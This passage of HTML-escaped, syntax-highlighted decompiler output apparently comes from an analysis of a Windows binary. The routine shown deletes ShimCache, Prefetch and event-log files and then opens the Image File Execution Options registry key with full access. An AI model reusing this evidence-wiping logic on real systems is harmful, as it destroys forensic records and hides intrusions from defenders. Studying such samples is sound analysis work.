style=\"color:#79B8FF\">140002bd5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002be4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x000003a0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002bec\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002bfb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c1b\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000380 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">AppCompat\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Programs\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">ShimCache.sys\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c2a\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c39\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000380 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c41\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c50\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c70\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000360 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Prefetch\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c7f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c8e\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000360 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002c96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ca5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_140073680\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002cc5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400a8620\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((longlong \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000340 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"C:\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">System32\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">winevt\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Logs\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002cd4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                FUN_1400736b0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ce3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pcVar12 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#B392F0\">FUN_140031060\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000340 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002ceb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                remove\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(pcVar12);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined1 \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                     &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000338 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">140002d1d\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">                RegOpenKeyExA\u003C/span>\u003Cspan style=\"color:#E1E4E8\">((HKEY)\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff80000002\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">                              \"SOFTWARE\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Microsoft\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Windows NT\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">CurrentVersion\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\\\\u003C/span>\u003Cspan style=\"color:#9ECBFF\">Image File Execution  Options\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                              ,\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">f003f\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(PHKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0xffffffffffffffe0 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar4 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">                pHVar2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(HKEY \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">stack0x00000338 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> lVar3);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(undefined8 \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((longlong)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">uStack_48 \u003C/span>\u003Cspan 